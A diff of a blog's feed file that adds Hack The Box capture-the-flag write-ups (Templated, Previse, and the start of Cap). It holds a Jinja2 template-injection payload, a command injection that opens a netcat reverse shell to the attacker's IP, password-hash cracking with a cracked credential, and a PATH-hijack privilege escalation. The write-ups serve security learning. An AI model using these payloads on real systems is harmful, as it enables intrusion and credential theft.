@@ -124,29 +124,26 @@ Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close
             
             <guid>https://harshitm98.github.io/posts/htb-challenge-templated/</guid>
             <description>Navigating through the website Requested: GET /invalid -&amp;gt; we got invalid
-![Pasted image 20211226121920.png](&amp;quot;/images/Pasted image 20211226121920.png&amp;quot;)
 Verifying if SSTI is possible Requested: GET /invalid{{7*7}} -&amp;gt; we got invalid49 instead of invalid{{7*7}}
-![[Pasted image 20211226121844.png]]
 We know that it is Jinja2 and Flask, so we can use their payload.
 Getting the flag Requested: GET /{{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat%20flag.txt&#39;).read()}} -&amp;gt; we got the flag
-![[Pasted image 20211226182358.png]]
 Alternative Finding subprocess.Popen index.
- GET /{{&#39;&#39;.__class__.mro()[1].__subclasses__()[100:] -&amp;gt; Popen is there in the list !</description>
+ GET /{{&#39;&#39;.__class__.mro()[1].__subclasses__()[100:] -&amp;gt; Popen is there in the list  GET /{{&#39;&#39;.__class__.mro()[1].__subclasses__()[300:] -&amp;gt; Popen is there in the list GET /{{&#39;&#39;.</description>
             <content type="html"><![CDATA[<h2 id="navigating-through-the-website">Navigating through the website</h2>
 <p>Requested: <code>GET /invalid</code> -&gt; we got <code>invalid</code></p>
-<p>![Pasted image 20211226121920.png](&quot;/images/Pasted image 20211226121920.png&quot;)</p>
+<p><img src="/img/templated/Pasted%20image%2020211226121920.png" alt=""></p>
 <h2 id="verifying-if-ssti-is-possible">Verifying if SSTI is possible</h2>
 <p>Requested: <code>GET /invalid{{7*7}}</code> -&gt; we got <code>invalid49</code> instead of <code>invalid{{7*7}}</code></p>
-<p>![[Pasted image 20211226121844.png]]</p>
+<p><img src="/img/templated/Pasted%20image%2020211226121844.png" alt=""></p>
 <p>We know that it is Jinja2 and Flask, so we can use their payload.</p>
 <h2 id="getting-the-flag">Getting the flag</h2>
 <p>Requested: <code>GET /{{config.__class__.__init__.__globals__['os'].popen('cat%20flag.txt').read()}}</code> -&gt; we got the flag</p>
-<p>![[Pasted image 20211226182358.png]]</p>
+<p><img src="/img/templated/Pasted%20image%2020211226182358.png" alt=""></p>
 <h3 id="alternative">Alternative</h3>
 <p><strong>Finding <code>subprocess.Popen</code> index.</strong></p>
 <ol>
 <li><code>GET /{{''.__class__.mro()[1].__subclasses__()[100:]</code> -&gt; Popen is there in the list
-![[Pasted image 20211226184612.png]]</li>
+<img src="/img/templated/Pasted%20image%2020211226184612.png" alt=""></li>
 <li><code>GET /{{''.__class__.mro()[1].__subclasses__()[300:]</code> -&gt; Popen is there in the list</li>
 <li><code>GET /{{''.__class__.mro()[1].__subclasses__()[500:]</code> -&gt; Internal Server Error</li>
 <li><code>GET /{{''.__class__.mro()[1].__subclasses__()[400:]</code> -&gt; Popen is there in the list</li>
@@ -160,6 +157,581 @@ Alternative Finding subprocess.Popen index.
 <li><a href="https://blog.nvisium.com/p255">https://blog.nvisium.com/p255</a></li>
 <li><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</a></li>
 </ul>
+]]></content>
+        </item>
+        
+        <item>
+            <title>HTB Previse - Writeup</title>
+            <link>https://harshitm98.github.io/posts/htb-machine-previse/</link>
+            <pubDate>Sat, 25 Dec 2021 00:00:00 +0000</pubDate>
+            
+            <guid>https://harshitm98.github.io/posts/htb-machine-previse/</guid>
+            <description>Enumeration Initial Enumeration Nmap Scans Initial:
+PORT STATE SERVICE REASON 22/tcp open ssh syn-ack 80/tcp open http syn-ack Service Scan:
+22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA) | 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA) |_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.29 (Ubuntu) | http-title: Previse Login |_Requested resource was login.</description>
+            <content type="html"><![CDATA[<h1 id="enumeration">Enumeration</h1>
+<h2 id="initial-enumeration">Initial Enumeration</h2>
+<h4 id="nmap-scans">Nmap Scans</h4>
+<p>Initial:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">PORT      STATE    SERVICE    REASON
+22/tcp    open     ssh        syn-ack
+80/tcp    open     http       syn-ack
+</code></pre></div><p>Service Scan:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
+|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
+|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| http-title: Previse Login
+|_Requested resource was login.php
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div><h2 id="enumeration-port-80">Enumeration: Port 80</h2>
+<h4 id="ffuf">Ffuf</h4>
+<p>common.txt</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">                        [Status: 200, Size: 2224, Words: 486, Lines: 54]
+config.php              [Status: 200, Size: 0, Words: 1, Lines: 1]
+css                     [Status: 200, Size: 939, Words: 61, Lines: 17]
+accounts.php            [Status: 200, Size: 2224, Words: 486, Lines: 54]
+download.php            [Status: 200, Size: 2224, Words: 486, Lines: 54]
+favicon.ico             [Status: 200, Size: 15400, Words: 15, Lines: 10]
+footer.php              [Status: 200, Size: 217, Words: 10, Lines: 6]
+files.php               [Status: 200, Size: 2224, Words: 486, Lines: 54]
+header.php              [Status: 200, Size: 980, Words: 183, Lines: 21]
+index.php               [Status: 200, Size: 2224, Words: 486, Lines: 54]
+index.php               [Status: 200, Size: 2224, Words: 486, Lines: 54]
+js                      [Status: 200, Size: 1155, Words: 77, Lines: 18]
+login.php               [Status: 200, Size: 2224, Words: 486, Lines: 54]
+logs.php                [Status: 200, Size: 2224, Words: 486, Lines: 54]
+logout.php              [Status: 200, Size: 2224, Words: 486, Lines: 54]
+nav.php                 [Status: 200, Size: 1248, Words: 462, Lines: 32]
+server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
+status.php              [Status: 200, Size: 2224, Words: 486, Lines: 54]
+</code></pre></div><p>medium.txt</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ffuf -u http://10.10.11.104/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -c -ic -of html -o http-medium.html
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">css                     [Status: 200, Size: 939, Words: 61, Lines: 17]
+js                      [Status: 200, Size: 1155, Words: 77, Lines: 18]
+                        [Status: 200, Size: 2224, Words: 486, Lines: 54]
+                        [Status: 200, Size: 2224, Words: 486, Lines: 54]
+server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
+</code></pre></div><h4 id="sql-injections">SQL injections</h4>
+<p><code>/login.php</code></p>
+<ul>
+<li>None of the sql injections worked.</li>
+<li><code>sqlmap</code> also did not work</li>
+<li>Request:
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">POST /login.php HTTP/1.1
+Host: 10.10.11.104
+Content-Length: 27
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://10.10.11.104
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-GPC: 1
+Referer: http://10.10.11.104/login.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Cookie: PHPSESSID=4natd10ok9pjvsrsuhr4ql0ktq
+Connection: close
+  
+username=&#39;+OR+1=1;--&amp;password=&#39;+OR+1=1;--
+</code></pre></div><pre><code>
+</code></pre></li>
+</ul>
+<h1 id="initial-foothold">Initial Foothold</h1>
+<h3 id="accountsphp">/accounts.php</h3>
+<p>Request of <code>accounts.php</code> is redirected to -&gt; <code>login.php</code></p>
+<p>But when intercepted with Burp, we have interesting results</p>
+<p><img src="/img/previse/Pasted%20image%2020211225134915.png" alt=""></p>
+<p>If we send a post request, we can create a new user
+<img src="/img/previse/Pasted%20image%2020211225134951.png" alt=""></p>
+<h4 id="sending-the-post-request">Sending the POST request</h4>
+<p>Request:</p>
+<p><img src="/img/previse/Pasted%20image%2020211225135604.png" alt=""></p>
+<p>Response:
+<img src="/img/previse/Pasted%20image%2020211225135625.png" alt=""></p>
+<p>So now we have a user with username and password as <code>fakebatman:fakebatman</code></p>
+<h2 id="getting-user-shell">Getting user shell</h2>
+<p>The logs file executes a python script and appends a delimiter that is parsed through a POST parameter</p>
+<p><em>logs.php</em></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">/////////////////////////////////////////////////////////////////////////////////////
+</span><span style="color:#75715e">//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
+</span><span style="color:#75715e">/////////////////////////////////////////////////////////////////////////////////////
+</span><span style="color:#75715e"></span>
+$output <span style="color:#f92672">=</span> <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;/usr/bin/python /opt/scripts/log_process.py </span><span style="color:#e6db74">{</span>$_POST[<span style="color:#e6db74">&#39;delim&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>);
+<span style="color:#66d9ef">echo</span> $output;
+</code></pre></div><p>So when we send the delim=<code>;ping 10.10.14.33 -c 5</code> and we run <code>tcpdump</code> to check if we are actually receiving any pings, we get ping hits.</p>
+<p>Appending the command:</p>
+<p><img src="/img/previse/Pasted%20image%2020211225175758.png" alt=""></p>
+<p>And we get the ping hits:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo tcpdump -i tun0 icmp
+</code></pre></div><p><img src="/img/previse/Pasted%20image%2020211225180213.png" alt=""></p>
+<h3 id="getting-a-reverse-shell-www-data">Getting a reverse shell (www-data)</h3>
+<p>Start a reverse shell</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nc -nlvp <span style="color:#ae81ff">4444</span>
+</code></pre></div><p>Send the request</p>
+<p><img src="/img/previse/Pasted%20image%2020211225180452.png" alt=""></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">delim=;nc+10.10.14.33+4444+-e+/bin/sh
+</span></code></pre></div><p>And we get a reverse shell</p>
+<p><img src="/img/previse/Pasted%20image%2020211225180415.png" alt=""></p>
+<h3 id="mysql-recon">MySQL recon</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ mysql -u root -p
+mysql&gt; SELECT * FROM accounts;
+SELECT * FROM accounts;
++----+---------------+------------------------------------+---------------------+
+| id | username      | password                           | created_at          |
++----+---------------+------------------------------------+---------------------+
+|  <span style="color:#ae81ff">1</span> | m4lwhere      | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
+</code></pre></div><p>Saving the hash into a file <code>m4lwhere.hash</code> and cracking the hash using hashcat</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hashcat -m <span style="color:#ae81ff">500</span> -a <span style="color:#ae81ff">0</span> m4lwhere.hash /usr/share/wordlists/rockyou.txt
+</code></pre></div><p>The cracked password</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
+</code></pre></div><h3 id="logging-in-using-these-creds">Logging in using these creds</h3>
+<p>and hoping for a password reuse</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ssh m4lwhere@10.10.11.104
+</code></pre></div><p>and <code>ilovecody112235!</code> as password we get a SSH shell</p>
+<p><img src="/img/previse/Pasted%20image%2020211225183445.png" alt=""></p>
+<h1 id="post-exploit-enumeration">Post Exploit Enumeration</h1>
+<h3 id="sudo--l">sudo -l</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">m4lwhere@previse:~$ sudo -l
+<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> m4lwhere:
+User m4lwhere may run the following commands on previse:
+    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> /opt/scripts/access_backup.sh
+</code></pre></div><p><em>access_backup.sh</em></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e"># We always make sure to store logs, we take security SERIOUSLY here</span>
+
+<span style="color:#75715e"># I know I shouldnt run this as root but I cant figure it out programmatically on my account</span>
+<span style="color:#75715e"># This is configured to run with cron, added to sudo so I can run as needed - we&#39;ll fix it later when there&#39;s time</span>
+
+gzip -c /var/log/apache2/access.log &gt; /var/backups/<span style="color:#66d9ef">$(</span>date --date<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;yesterday&#34;</span> +%Y%b%d<span style="color:#66d9ef">)</span>_access.gz
+gzip -c /var/www/file_access.log &gt; /var/backups/<span style="color:#66d9ef">$(</span>date --date<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;yesterday&#34;</span> +%Y%b%d<span style="color:#66d9ef">)</span>_file_access.gz
+</code></pre></div><p>Absolute paths for <code>gzip</code> and <code>date</code> is not mentioned.</p>
+<h3 id="creating-a-new-file">Creating a new file</h3>
+<p>Going to <code>/tmp</code> directory and creating a <code>date</code> file with contents</p>
+<p><em>date</em></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc 10.10.14.33 <span style="color:#ae81ff">9001</span> -e /bin/bash
+</code></pre></div><p><img src="/img/previse/Pasted%20image%2020211225192245.png" alt=""></p>
+<p>And then we add <code>tmp/</code> directory to the path</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ export PATH<span style="color:#f92672">=</span>tmp:/$PATH
+</code></pre></div><p>Now we run our script</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo /opt/scripts/access_backup.sh
+</code></pre></div><p>And we get a shell on our reverse tcp listener
+<img src="/img/previse/Pasted%20image%2020211225192210.png" alt=""></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>HTB Cap - Writeup</title>
+            <link>https://harshitm98.github.io/posts/htb-machine-cap/</link>
+            <pubDate>Fri, 23 Jul 2021 00:00:00 +0000</pubDate>
+            
+            <guid>https://harshitm98.github.io/posts/htb-machine-cap/</guid>
+            <description>Enumeration Nmap Scans Service Scan # Nmap 7.91 scan initiated Fri Jul 16 20:44:02 2021 as: nmap -T4 -A -p21,22,80 -oA nmap/service-scan -Pn 10.10.10.245 Nmap scan report for 10.10.10.245 Host is up (0.068s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |_ 256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519) 80/tcp open http gunicorn | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 404 NOT FOUND | Server: gunicorn | Date: Fri, 16 Jul 2021 15:14:15 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Content-Length: 232 | &amp;lt;!</description>
+            <content type="html"><![CDATA[<h1 id="enumeration">Enumeration</h1>
+<h2 id="nmap-scans">Nmap Scans</h2>
+<h3 id="service-scan">Service Scan</h3>
+<pre><code># Nmap 7.91 scan initiated Fri Jul 16 20:44:02 2021 as: nmap -T4 -A -p21,22,80 -oA nmap/service-scan -Pn 10.10.10.245
+Nmap scan report for 10.10.10.245
+Host is up (0.068s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
+80/tcp open  http    gunicorn
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 404 NOT FOUND
+|     Server: gunicorn
+|     Date: Fri, 16 Jul 2021 15:14:15 GMT
+|     Connection: close
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 232
+|     &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;
+|     &lt;title&gt;404 Not Found&lt;/title&gt;
+|     &lt;h1&gt;Not Found&lt;/h1&gt;
+|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Server: gunicorn
+|     Date: Fri, 16 Jul 2021 15:14:09 GMT
+|     Connection: close
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 19386
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html class=&quot;no-js&quot; lang=&quot;en&quot;&gt;
+|     &lt;head&gt;
+|     &lt;meta charset=&quot;utf-8&quot;&gt;
+|     &lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&gt;
+|     &lt;title&gt;Security Dashboard&lt;/title&gt;
+|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
+|     &lt;link rel=&quot;shortcut icon&quot; type=&quot;image/png&quot; href=&quot;/static/images/icon/favicon.ico&quot;&gt;
+|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/bootstrap.min.css&quot;&gt;
+|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/font-awesome.min.css&quot;&gt;
+|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/themify-icons.css&quot;&gt;
+|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/metisMenu.css&quot;&gt;
+|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/owl.carousel.min.css&quot;&gt;
+|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/slicknav.min.css&quot;&gt;
+|     &lt;!-- amchar
+|   HTTPOptions: 
+|     HTTP/1.0 200 OK
+|     Server: gunicorn
+|     Date: Fri, 16 Jul 2021 15:14:09 GMT
+|     Connection: close
+|     Content-Type: text/html; charset=utf-8
+|     Allow: HEAD, OPTIONS, GET
+|     Content-Length: 0
+|   RTSPRequest: 
+|     HTTP/1.1 400 Bad Request
+|     Connection: close
+|     Content-Type: text/html
+|     Content-Length: 196
+|     &lt;html&gt;
+|     &lt;head&gt;
+|     &lt;title&gt;Bad Request&lt;/title&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;h1&gt;&lt;p&gt;Bad Request&lt;/p&gt;&lt;/h1&gt;
+|     Invalid HTTP Version &amp;#x27;Invalid HTTP Version: &amp;#x27;RTSP/1.0&amp;#x27;&amp;#x27;
+|     &lt;/body&gt;
+|_    &lt;/html&gt;
+|_http-server-header: gunicorn
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port80-TCP:V=7.91%I=7%D=7/16%Time=60F1A242%P=x86_64-pc-linux-gnu%r(GetR
+SF:equest,2FE5,&quot;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20
+SF:Fri,\x2016\x20Jul\x202021\x2015:14:09\x20GMT\r\nConnection:\x20close\r\
+SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20193
+SF:86\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20class=\&quot;no-js\&quot;\x20lang=\&quot;en\&quot;&gt;\
+SF:n\n&lt;head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n\x20\x20\x20\x2
+SF:0&lt;meta\x20http-equiv=\&quot;x-ua-compatible\&quot;\x20content=\&quot;ie=edge\&quot;&gt;\n\x20\
+SF:x20\x20\x20&lt;title&gt;Security\x20Dashboard&lt;/title&gt;\n\x20\x20\x20\x20&lt;meta\
+SF:x20name=\&quot;viewport\&quot;\x20content=\&quot;width=device-width,\x20initial-scale=
+SF:1\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;shortcut\x20icon\&quot;\x20type=\&quot;image
+SF:/png\&quot;\x20href=\&quot;/static/images/icon/favicon\.ico\&quot;&gt;\n\x20\x20\x20\x20&lt;
+SF:link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/bootstrap\.min\.css\&quot;&gt;
+SF:\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/fon
+SF:t-awesome\.min\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20
+SF:href=\&quot;/static/css/themify-icons\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=
+SF:\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/metisMenu\.css\&quot;&gt;\n\x20\x20\x20\x2
+SF:0&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/owl\.carousel\.min\.
+SF:css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/c
+SF:ss/slicknav\.min\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;!--\x20amchar&quot;)%r(HTTPOption
+SF:s,B3,&quot;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Fri,\x2
+SF:016\x20Jul\x202021\x2015:14:09\x20GMT\r\nConnection:\x20close\r\nConten
+SF:t-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20HEAD,\x20OPTIONS,\x
+SF:20GET\r\nContent-Length:\x200\r\n\r\n&quot;)%r(RTSPRequest,121,&quot;HTTP/1\.1\x2
+SF:0400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20text
+SF:/html\r\nContent-Length:\x20196\r\n\r\n&lt;html&gt;\n\x20\x20&lt;head&gt;\n\x20\x20
+SF:\x20\x20&lt;title&gt;Bad\x20Request&lt;/title&gt;\n\x20\x20&lt;/head&gt;\n\x20\x20&lt;body&gt;\
+SF:n\x20\x20\x20\x20&lt;h1&gt;&lt;p&gt;Bad\x20Request&lt;/p&gt;&lt;/h1&gt;\n\x20\x20\x20\x20Invali
+SF:d\x20HTTP\x20Version\x20&amp;#x27;Invalid\x20HTTP\x20Version:\x20&amp;#x27;RTSP
+SF:/1\.0&amp;#x27;&amp;#x27;\n\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&quot;)%r(FourOhFourRequest,189
+SF:,&quot;HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x20F
+SF:ri,\x2016\x20Jul\x202021\x2015:14:15\x20GMT\r\nConnection:\x20close\r\n
+SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20232\
+SF:r\n\r\n&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&quot;-//W3C//DTD\x20HTML\x203\.2\x20
+SF:Final//EN\&quot;&gt;\n&lt;title&gt;404\x20Not\x20Found&lt;/title&gt;\n&lt;h1&gt;Not\x20Found&lt;/h1&gt;
+SF:\n&lt;p&gt;The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20ser
+SF:ver\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20ch
+SF:eck\x20your\x20spelling\x20and\x20try\x20again\.&lt;/p&gt;\n&quot;);
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Jul 16 20:47:13 2021 -- 1 IP address (1 host up) scanned in 190.95 seconds
+</code></pre><ul>
+<li>Port 21, 80 open</li>
+</ul>
+<h2 id="enumeration-port-80">Enumeration: Port 80</h2>
+<ul>
+<li>gunicorn</li>
+</ul>
+<h3 id="ip"><code>/ip</code></h3>
+<p>Runs <code>ifconfig</code> on the machine</p>
+<p><img src="/img/cap/Pasted_image_20210716205953.png" alt="/img/cap/Pasted_image_20210716205953.png"></p>
+<h3 id="netstat"><code>/netstat</code></h3>
+<p>Runs <code>netstat</code> on the machine</p>
+<h3 id="capture"><code>/capture</code></h3>
+<p>Captures PCAP packets of the server and made available for download</p>
+<h3 id="ffuf-scan">ffuf scan</h3>
+<pre><code>$ ffuf -u &lt;http://10.10.10.245/FUZZ&gt; -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -r -v -c -ic -of html -o http/http-80-medium-no-ext.html
+
+         /'___\\  /'___\\           /'___\\
+        /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/
+       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\
+        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/
+         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\
+          \\/_/    \\/_/   \\/___/    \\/_/
+
+       v1.3.0-git
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : &lt;http://10.10.10.245/FUZZ&gt;
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+ :: Output file      : http/http-80-medium-no-ext.html
+ :: File format      : html
+ :: Follow redirects : true
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+[Status: 200, Size: 19385, Words: 8716, Lines: 389]
+| URL | &lt;http://10.10.10.245/&gt;
+    * FUZZ:
+
+[Status: 200, Size: 19385, Words: 8716, Lines: 389]
+| URL | &lt;http://10.10.10.245/data&gt;
+    * FUZZ: data
+
+[Status: 200, Size: 17445, Words: 7275, Lines: 355]
+| URL | &lt;http://10.10.10.245/ip&gt;
+    * FUZZ: ip
+
+[Status: 200, Size: 72923, Words: 36727, Lines: 768]
+| URL | &lt;http://10.10.10.245/netstat&gt;
+    * FUZZ: netstat
+
+[Status: 200, Size: 19385, Words: 8716, Lines: 389]
+| URL | &lt;http://10.10.10.245/capture&gt;
+    * FUZZ: capture
+
+[Status: 200, Size: 19385, Words: 8716, Lines: 389]
+| URL | &lt;http://10.10.10.245/&gt;
+    * FUZZ:
+
+:: Progress: [207630/207630] :: Job [1/1] :: 633 req/sec :: Duration: [0:05:37] :: Errors: 0 ::
+
+</code></pre><pre><code>/
+/data
+/ip
+/capture
+/netstat
+
+</code></pre><ul>
+<li>
+<p>The packets captured on <code>/capture</code> are available as <code>/data/1</code> and so forth. The number starts from 1.</p>
+</li>
+<li>
+<p>Opening <code>/data/0</code> being packet not captured by us. Might find something juicy.</p>
+</li>
+<li>
+<p>Downloading it and opening in wireshark</p>
+<p><img src="/img/cap/Pasted_image_20210717190239.png" alt="/img/cap/Pasted_image_20210717190239.png"></p>
